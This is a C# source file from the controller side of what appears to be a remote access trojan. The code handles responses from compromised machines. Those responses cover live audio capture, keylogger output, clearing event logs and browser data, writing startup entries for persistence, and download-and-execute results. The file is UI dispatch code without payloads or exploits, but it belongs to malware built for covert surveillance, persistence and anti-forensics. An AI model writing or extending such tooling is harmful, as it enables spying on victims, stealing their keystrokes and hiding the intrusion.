using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using RemoteControl.Protocals;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using log4net;
using RemoteControl.Protocals.Plugin;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;
using RemoteControl.Audio;
using RemoteControl.Audio.Codecs;
using RemoteControl.Protocals.Utilities;
using RemoteControl.Protocals.Relay;
using RemoteControl.Server.Utils;
namespace RemoteControl.Server
{
    public partial class FrmMain
    {
        private void HandleToolResponsePackets(PacketReceivedEventArgs e)
        {
            if (e.PacketType == ePacketType.PACKET_START_CAPTURE_AUDIO_RESPONSE)
            {
                var resp = e.Obj as ResponseStartCaptureAudio;
                if (resp == null || resp.AudioData == null) return;
                string sid = e.Session != null ? e.Session.SocketId : null;
                if (sid != null && sessionAudioMonitorForms.ContainsKey(sid) && !sessionAudioMonitorForms[sid].IsDisposed)
                {
                    sessionAudioMonitorForms[sid].HandleAudioData(resp.AudioData);
                }
                else if (_waveOut != null)
                {
                    byte[] decodedData = G711.Decode_aLaw(resp.AudioData, 0, resp.AudioData.Length);
                    _waveOut.Play(decodedData, 0, decodedData.Length);
                }
            }
            else if (e.PacketType == ePacketType.PACKET_SERVICE_MANAGER_RESPONSE)
            {
                var resp = e.Obj as ResponseServiceManager;
                if (resp == null) return;

                // 路由到FrmServiceManager窗口
                string sid = e.Session != null ? e.Session.SocketId : null;
                if (sid != null && sessionSvcMgrForms.ContainsKey(sid) && !sessionSvcMgrForms[sid].IsDisposed)
                {
                    sessionSvcMgrForms[sid].HandleResponse(resp);
                }
                else if (resp.Services != null)
                {
                    this.UpdateUI(() =>
                    {
                        this.textBoxCommandResponse.AppendText("=== 服务列表 ===\r\n");
                        foreach (var svc in resp.Services)
                        {
                            this.textBoxCommandResponse.AppendText(
                                string.Format("{0} | {1} | {2}\r\n",
                                    svc.ServiceName, svc.DisplayName, svc.Status));
                        }
                        this.textBoxCommandResponse.AppendText("=== 共 " + resp.Services.Count + " 个服务 ===\r\n");
                    });
                }
                else
                {
                    doOutput(resp.Message);
                    if (resp.Result && currentSession != null)
                    {
                        currentSession.Send(ePacketType.PACKET_SERVICE_MANAGER_REQUEST, new RequestServiceManager { Action = eServiceAction.List });
                    }
                }
            }
            else if (e.PacketType == ePacketType.PACKET_REMOTE_CHAT_RESPONSE)
            {
                var resp = e.Obj as ResponseRemoteChat;
                if (resp == null) return;
                this.UpdateUI(() =>
                {
                    this.textBoxCommandResponse.AppendText("=== 远程聊天回复 ===\r\n");
                    this.textBoxCommandResponse.AppendText("发送: " + resp.RequestMessage + "\r\n");
                    this.textBoxCommandResponse.AppendText("回复: " + resp.Reply + "\r\n");
                });
            }
            else if (e.PacketType == ePacketType.PACKET_FIND_WINDOW_RESPONSE)
            {
                var resp = e.Obj as ResponseFindWindow;
                if (resp == null || resp.Windows == null) return;
                this.UpdateUI(() =>
                {
                    this.textBoxCommandResponse.AppendText("=== 窗口查找结果 ===\r\n");
                    foreach (var window in resp.Windows)
                    {
                        this.textBoxCommandResponse.AppendText(
                            string.Format("{0} | PID:{1} | {2} | HWND:{3}\r\n",
                                window.Title, window.ProcessId, window.ProcessName, window.Handle));
                    }
                    this.textBoxCommandResponse.AppendText("=== 共 " + resp.Windows.Count + " 个窗口 ===\r\n");
                });
            }
            else if (e.PacketType == ePacketType.PACKET_KEYLOGGER_RESPONSE)
            {
                var resp = e.Obj as ResponseKeylogger;
                if (resp == null || string.IsNullOrEmpty(resp.LogData)) return;
                this.UpdateUI(() =>
                {
                    this.textBoxCommandResponse.AppendText(
                        DateTime.Now.ToString("HH:mm:ss") + " [Keylog] " + resp.LogData + "\r\n");
                });
            }
            else if (e.PacketType == ePacketType.PACKET_CLEAR_LOG_RESPONSE)
            {
                var resp = e.Obj as ResponseClearLog;
                if (resp != null)
                    doOutput(resp.Result ? "清除日志成功" : "清除日志失败: " + resp.Message);
            }
            else if (e.PacketType == ePacketType.PACKET_CLEAR_BROWSER_DATA_RESPONSE)
            {
                var resp = e.Obj as ResponseClearBrowserData;
                if (resp != null)
                    doOutput(resp.Result ? "清除浏览器数据成功" : "清除浏览器数据失败: " + resp.Message);
            }
            else if (e.PacketType == ePacketType.PACKET_RUN_FILE_RESPONSE)
            {
                var resp = e.Obj as ResponseRunFile;
                if (resp != null)
                    doOutput(resp.Result ? "运行文件成功" : "运行文件失败: " + resp.Message);
            }
            else if (e.PacketType == ePacketType.PACKET_COMPRESS_FILE_RESPONSE)
            {
                var resp = e.Obj as ResponseCompressFile;
                if (resp != null)
                {
                    doOutput(resp.Result ? "压缩文件成功" : "压缩文件失败: " + resp.Message);
                    if (resp.Result)
                        RefreshCurrentFileView();
                }
            }
            else if (e.PacketType == ePacketType.PACKET_DECOMPRESS_FILE_RESPONSE)
            {
                var resp = e.Obj as ResponseDecompressFile;
                if (resp != null)
                {
                    doOutput(resp.Result ? "解压文件成功" : "解压文件失败: " + resp.Message);
                    if (resp.Result)
                        RefreshCurrentFileView();
                }
            }
            else if (e.PacketType == ePacketType.PACKET_WRITE_STARTUP_RESPONSE)
            {
                var resp = e.Obj as ResponseWriteStartup;
                if (resp != null)
                    doOutput(resp.Result ? "写入启动项成功" : "写入启动项失败: " + resp.Message);
            }
            else if (e.PacketType == ePacketType.PACKET_DOWNLOAD_EXEC_RESPONSE)
            {
                var resp = e.Obj as ResponseDownloadExec;
                if (resp != null)
                    doOutput(resp.Result ? "下载执行成功" : "下载执行失败: " + resp.Message);
            }
            else if (e.PacketType == ePacketType.PACKET_CHANGE_CONFIG_RESPONSE)
            {
                var resp = e.Obj as ResponseChangeConfig;
                if (resp != null)
                {
                    doOutput(resp.Result ? "更改配置成功: " + resp.Message : "更改配置失败: " + resp.Message);
                }
            }
            else if (e.PacketType == ePacketType.PACKET_CHANGE_RESOLUTION_RESPONSE)
            {
                var resp = e.Obj as ResponseChangeResolution;
                if (resp != null)
                {
                    if (resp.Result)
                    {
                        doOutput(string.Format("分辨率修改成功: {0}x{1} -> {2}x{3}",
                            resp.PreviousWidth, resp.PreviousHeight, resp.CurrentWidth, resp.CurrentHeight));
                    }
                    else
                    {
                        doOutput("分辨率修改失败: " + resp.Message);
                    }
                }
            }
            else if (e.PacketType == ePacketType.PACKET_GET_WINDOWS_RESPONSE)
            {
                var resp = e.Obj as ResponseGetWindows;
                if (resp == null) return;
                string sid = e.Session != null ? e.Session.SocketId : null;
                if (sid != null && sessionWindowMgrForms.ContainsKey(sid) && !sessionWindowMgrForms[sid].IsDisposed)
                {
                    sessionWindowMgrForms[sid].HandleResponse(resp);
                }
            }
            else if (e.PacketType == ePacketType.PACKET_GET_NETWORK_CONNECTIONS_RESPONSE)
            {
                var resp = e.Obj as ResponseGetNetworkConnections;
                if (resp == null) return;
                string sid = e.Session.SocketId;
                FrmNetworkInfo frm;
                if (sessionNetworkInfoForms.TryGetValue(sid, out frm) && !frm.IsDisposed)
                {
                    frm.HandleResponse(resp);
                }
            }
        }
    }
}
